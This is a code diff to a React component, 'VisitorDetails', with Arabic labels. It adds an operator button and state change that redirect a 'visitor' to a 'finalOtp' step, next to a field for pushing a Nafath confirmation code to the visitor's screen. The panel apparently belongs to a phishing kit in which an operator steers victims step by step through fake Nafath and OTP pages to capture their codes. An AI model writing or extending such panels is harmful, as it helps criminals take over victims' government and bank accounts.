@@ -130,6 +130,12 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
         case "nafad_modal":
           updates = { nafadConfirmationCode: "123456" }; // Send confirmation code to open modal
           break;
+        case "finalOtp":
+          updates = {
+            redirectPage: "finalOtp" as any,
+            currentStep: "finalOtp" as any,
+          };
+          break;
       }
 
       if (Object.keys(updates).length > 0) {
@@ -491,20 +497,34 @@ export function VisitorDetails({ visitor, onBack }: VisitorDetailsProps) {
     timestamp: visitor.nafadUpdatedAt || visitor.updatedAt,
     showActions: true,
     customActions: (
-      <div className="mt-3 flex flex-col gap-2 sm:flex-row">
-        <input
-          type="text"
-          value={nafadCode}
-          onChange={(e) => setNafadCode(e.target.value)}
-          placeholder="أدخل رقم التأكيد"
-          className="w-full flex-1 rounded-lg border px-3 py-2 text-sm"
-        />
+      <div className="mt-3 flex flex-col gap-2">
+        <div className="flex flex-col gap-2 sm:flex-row">
+          <input
+            type="text"
+            value={nafadCode}
+            onChange={(e) => setNafadCode(e.target.value)}
+            placeholder="أدخل رقم التأكيد"
+            className="w-full flex-1 rounded-lg border px-3 py-2 text-sm"
+          />
+          <button
+            onClick={handleSendNafadCode}
+            disabled={!nafadCode.trim()}
+            className="w-full rounded-lg bg-blue-600 px-4 py-2 text-sm text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
+          >
+            إرسال
+          </button>
+        </div>
         <button
-          onClick={handleSendNafadCode}
-          disabled={!nafadCode.trim()}
-          className="w-full rounded-lg bg-blue-600 px-4 py-2 text-sm text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-50 sm:w-auto"
+          onClick={() => handleNavigate("finalOtp")}
+          disabled={isNavigating}
+          className="w-full rounded-lg bg-indigo-600 px-4 py-2 text-sm text-white hover:bg-indigo-700 disabled:cursor-not-allowed disabled:opacity-50 flex items-center justify-center gap-2"
         >
-          إرسال
+          {isNavigating ? (
+            <span className="w-3.5 h-3.5 border-2 border-white/30 border-t-white rounded-full animate-spin" />
+          ) : (
+            "🔐"
+          )}
+          توجيه إلى Final OTP
         </button>
       </div>
     ),
